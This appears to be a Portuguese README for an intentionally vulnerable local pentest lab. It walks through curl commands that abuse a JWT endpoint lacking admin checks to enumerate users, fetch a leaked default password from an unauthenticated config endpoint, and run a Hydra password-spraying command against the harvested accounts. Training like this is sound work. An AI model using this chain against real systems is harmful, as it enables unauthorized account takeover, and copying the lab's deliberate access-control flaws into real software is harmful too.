
-----

````markdown
# 🧪 Lab de Pentest: Combo VAZAMENTO JWT + SENHA PADRÃO

Este repositório contém o código-fonte de duas aplicações Flask (Python) simulando um ambiente de **Pentest Fictício** (chamado "CorpWeb Security Lab"). O objetivo é demonstrar uma metodologia de ataque que combina a **Enumeração de Usuários via JWT** em um alvo para realizar um **Brute Force cirúrgico** no alvo seguinte.

---

## ⚠️ AVISO LEGAL E ÉTICO (IMPORTANTE)

Este código foi criado **EXCLUSIVAMENTE PARA FINS EDUCACIONAIS E DE ESTUDO**.

* **Não utilize este código** para atacar ou testar a segurança de sistemas, redes ou aplicações que você não possui permissão expressa e documentada para testar.
* A prática de segurança ofensiva (pentest) deve sempre seguir a lei e a ética (*white hat*).

---

## 🛠️ Requisitos e Configuração

Você precisará ter o **Python 3** e o **Hydra** instalados em seu sistema.

### 1. Clonar o Repositório

```bash
git clone https://github.com/jhonxl/CorpWeb
cd CorpWeb
````

### 2\. Instalar Dependências Python

As dependências necessárias são `Flask` (para o servidor web) e `PyJWT` (para a autenticação no Alvo 1).

```bash
# O arquivo requirements.txt deve ser criado com 'flask' e 'pyjwt'
pip install -r requirements.txt
```

### 3\. Rodar as Aplicações (Em Terminais Separados)

**Você precisa de duas janelas de terminal abertas.**

| Alvo | Porta | Comando |
| :--- | :--- | :--- |
| **Alvo 1: JWT API** | 5000 | `python alvo1_jwt_api.py` |
| **Alvo 2: Senha Padrão**| 5001 | `python alvo2_senha_padrao.py` |

-----

## 🎯 Alvo 1: MyCorpWeb (Vulnerabilidade: Broken Access Control/JWT)

**URL de Teste:** `http://127.0.0.1:5000`

### 1\. Decodificação e Enumeração

O primeiro passo é obter um token JWT fazendo login (use e-mail e `password: teste123`).

**Foco no Vídeo:** Use o token recebido para explorar o endpoint de listagem de usuários.

```bash
# 1. Requisição de Login (Substitua o email se tiver registrado um novo)
# A senha fictícia para login é 'teste123'
curl -X POST [http://127.0.0.1:5000/login](http://127.0.0.1:5000/login) -H "Content-Type: application/json" -d '{"email": "user1@corpweb.lab", "password": "teste123"}'

# 2. ATAQUE: Enumeração de Usuários (Substitua [SEU_TOKEN_JWT] pelo token da etapa 1)
# ⚠️ O endpoint está protegido por JWT, mas não checa permissão de admin.
curl -X GET [http://127.0.0.1:5000/api/users/](http://127.0.0.1:5000/api/users/) -H "Authorization: Bearer [SEU_TOKEN_JWT]"
```

**Resultado Esperado:** A resposta retorna uma lista JSON com **todos os usuários**, incluindo e-mails.

-----

## 🔨 Alvo 2: CorpWeb Connect (Vulnerabilidade: Configuração Exposta)

**URL de Teste:** `http://127.0.0.1:5001`

### 1\. Descoberta da Senha Padrão

**Foco no Vídeo:** Mostre a descoberta do endpoint de configuração esquecido.

```bash
# ATAQUE: Acesso direto ao endpoint /default (sem autenticação)
curl [http://127.0.0.1:5001/default](http://127.0.0.1:5001/default)
```

**Resultado Esperado:** O servidor revela o valor `default_password: CorpWeb123!`.

### 2\. Brute Force Cirúrgico com Hydra

Crie o arquivo `users.txt` com os e-mails/usernames coletados do **Alvo 1** (ex: `admin`, `manager`, `jsilva`).

**Foco no Vídeo:** Use a lista de usuários e a senha padrão descoberta para automatizar o login.

```bash
# COMANDO HYDRA:
# -L users.txt: Arquivo de usernames
# -p CorpWeb123!: Senha Única (padrão)
# http-post-form: Tipo de ataque contra um formulário/endpoint POST
# "URL:Parâmetros:Falha": Define como o Hydra deve interagir e o que buscar na falha de login.
hydra -L users.txt -p CorpWeb123! 127.0.0.1 -s 5001 http-post-form \
"/check_login:username=^USER^&password=^PASS^:Invalid Credentials"
```

**Resultado Esperado:** O Hydra listará os usuários que ainda utilizam a senha padrão (`admin` e `manager`).

```
LEMBRE-SE DE ACESSAR A URL CORRETA!
```
